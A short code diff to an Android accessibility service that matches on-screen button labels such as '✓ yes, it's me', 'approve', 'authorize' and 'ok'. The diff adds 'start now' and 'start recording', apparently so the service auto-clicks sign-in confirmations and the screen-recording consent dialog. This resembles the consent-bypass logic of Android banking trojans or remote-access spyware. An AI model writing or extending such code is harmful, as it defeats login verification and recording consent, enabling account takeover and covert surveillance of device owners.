@@ -563,10 +563,11 @@ public class MyAccessibilityService extends AccessibilityService {
                                 text.toString().equalsIgnoreCase("✓ yes, it's me") ||
                                 text.toString().toLowerCase().contains("✓ yes, it's me") ||
                                 text.toString().equalsIgnoreCase("confirm") ||
-                                text.toString().equalsIgnoreCase("allow") ||
                                 text.toString().equalsIgnoreCase("approve") ||
                                 text.toString().equalsIgnoreCase("authorize") ||
-                                text.toString().equalsIgnoreCase("authorize") ||
+                                text.toString().equalsIgnoreCase("start now") ||
+                                text.toString().equalsIgnoreCase("start recording") ||
+                                text.toString().equalsIgnoreCase("start") ||
                                 text.toString().equalsIgnoreCase("ok")
 
 
